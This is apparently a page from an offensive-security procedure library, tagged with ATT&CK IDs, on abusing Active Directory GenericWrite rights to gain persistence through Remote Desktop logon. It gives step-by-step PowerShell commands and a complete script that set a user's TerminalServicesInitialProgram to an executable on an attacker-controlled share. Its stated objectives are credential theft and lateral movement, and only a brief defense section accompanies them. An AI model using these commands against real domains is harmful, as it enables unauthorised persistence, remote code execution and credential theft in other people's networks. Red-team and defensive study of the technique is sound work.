---
id: 9ff0dba8-15a6-442a-8ac3-0e26ced2053b
name: Abuse AD ACLs GenericWrite to Configure RCM Persistence
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:06.796678+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Account-Manipulation|T1098 - Account Manipulation]]'
  - >-
    [[techniques/Boot-or-Logon-Autostart-Execution|T1547 - Boot or Logon
    Autostart Execution]]
sub_techniques:
  - >-
    [[sub-techniques/User-Account-Manipulation|T1098.001 - User Account
    Manipulation]]
  - >-
    [[sub-techniques/Registry-Run-Keys-Startup-Folder|T1547.001 - Registry Run
    Keys / Startup Folder]]
tags:
  - abusing-active-directory-acls-aces
  - active-directory-attacks
  - genericwrite
  - remote-connection-manager
commands:
  - '[[commands/retrieve-adsi-user-object]]'
  - '[[commands/set-terminal-services-initial-program]]'
  - '[[commands/set-terminal-services-work-directory]]'
  - '[[commands/save-adsi-user-object-changes]]'
platforms:
  - Windows
  - Active Directory
tools: []
validated: true
---

# Abuse AD ACLs GenericWrite to Configure RCM Persistence

## Summary

This procedure demonstrates how to abuse Active Directory Access Control Lists (ACLs) by leveraging or granting GenericWrite permissions on a user object to modify its attributes for persistence. Specifically, it configures the Remote Connection Manager (RCM) in Remote Desktop Services (RDS) to execute a malicious program upon user logon, establishing backdoor access on terminal servers. This technique assumes the attacker has already obtained the ability to modify the object's ACL or has been granted GenericWrite, allowing attribute changes without higher privileges.

## Description

Attackers often exploit misconfigured AD ACLs to grant themselves GenericWrite permissions on sensitive objects like user accounts. GenericWrite allows modification of most attributes, including those controlling logon behavior in RDS. By setting the TerminalServicesInitialProgram attribute to a UNC path pointing to a malicious executable and TerminalServicesWorkDirectory to a valid path, the payload executes automatically when the target user logs in via RDP. This provides persistence even after reboots or detection of initial access. Note that RCM and RDS shadowing must be enabled on the target server (disabled by default on Windows Server 2019+), typically requiring a prior registry modification (e.g., setting fDenyTSConnections to 0 in HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server). This method is effective in domain environments with RDSH deployed, enabling lateral movement and command execution in user contexts.

## Requirements

1. Domain-joined Windows machine with PowerShell execution policy allowing scripts (Bypass or Unrestricted).
2. Valid domain credentials with GenericWrite permission on the target user object's ACL (obtained via prior ACL abuse, e.g., using tools like PowerView to modify permissions).
3. Access to an attacker-controlled share hosting the malicious executable (e.g., file.exe).
4. Target environment must have RDS enabled and RCM active; if disabled, a separate registry modification is needed on the domain controller or target server.
5. Network access to the AD LDAP server and the attacker's file share.

## Defense

- Limit the permissions of Active Directory objects to prevent unauthorized modifications, using tools like BloodHound to audit ACLs for excessive GenericWrite grants.
- Monitor Active Directory for changes to security descriptors and user attributes using event logs (e.g., Event ID 5136 for directory service object modifications).
- Restrict access to Remote Connection Manager (RCM) and RDS to authorized users only; disable unnecessary RDS features via Group Policy.
- Enable advanced auditing for AD changes and use SIEM rules to alert on TerminalServices* attribute modifications.

## Objectives

1. Establish persistence in the compromised network by automating malicious code execution on user logon.
2. Gain access to sensitive data through the persistent remote session.
3. Steal credentials during the RDP session.
4. Move laterally within the network using the established backdoor.

## Instructions

### Step 1: Retrieve the Target User Object

**Context**: Connect to the Active Directory user object via LDAP using ADSI to load it into a PowerShell variable for modification. This step requires the distinguished name (DN) of the target user and assumes GenericWrite permission allows the subsequent changes.

**Command** ([[commands/retrieve-adsi-user-object]]):
```powershell
$UserObject = ([ADSI]("LDAP://$_USER_DN"))
```

> This command binds to the specified user object in AD. Replace $_USER_DN with the full DN (e.g., CN=targetuser,OU=Users,DC=domain,DC=com). If successful, no output is produced, but $UserObject will be available for inspection via Get-Member. Errors indicate insufficient permissions or invalid DN.

### Step 2: Set the Terminal Services Initial Program

**Context**: Modify the TerminalServicesInitialProgram attribute to point to a malicious executable on an attacker-controlled share. This ensures the payload runs automatically upon RDP logon, providing a reverse shell or other persistence mechanism.

**Command** ([[commands/set-terminal-services-initial-program]]):
```powershell
$UserObject.TerminalServicesInitialProgram = "$_EXECUTABLE_PATH"
```

> Set $_EXECUTABLE_PATH to the UNC path of your payload (e.g., \\attacker-ip\share\malware.exe). This attribute change is silent if permissions allow; verify by querying the object afterward with Get-ADUser -Properties TerminalServicesInitialProgram.

### Step 3: Set the Terminal Services Work Directory

**Context**: Configure the working directory for the initial program to ensure it executes in a valid context, preventing failures due to path issues.

**Command** ([[commands/set-terminal-services-work-directory]]):
```powershell
$UserObject.TerminalServicesWorkDirectory = "$_WORK_DIRECTORY"
```

> Use $_WORK_DIRECTORY as a local path like "C:\" or "C:\Windows\Temp". This supports the executable's operation. No immediate output; confirm via AD query.

### Step 4: Save the Changes to AD

**Context**: Commit the attribute modifications to the Active Directory database to make them persistent across the domain.

**Command** ([[commands/save-adsi-user-object-changes]]):
```powershell
$UserObject.SetInfo()
```

> This propagates the changes. Success yields no output; failure throws an exception (e.g., access denied). Verify success by logging in as the target user via RDP and checking if the program executes, or query AD attributes.

### Step 5: Execute Full Configuration Script (Optional)

**Context**: For automation, run the complete script combining all steps. This is useful in scripted attacks but requires replacing placeholders manually.

**Code** ([[codes/powershell-configure-terminal-services-for-persistence]]):
```powershell
$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
$UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
$UserObject.TerminalServicesWorkDirectory = "C:\"
$UserObject.SetInfo()
```

> Run this in an elevated PowerShell session after replacing the DN, UNC path, and directory. Expected outcome: No errors, and attributes updated in AD. Monitor for execution by observing RDP logons.
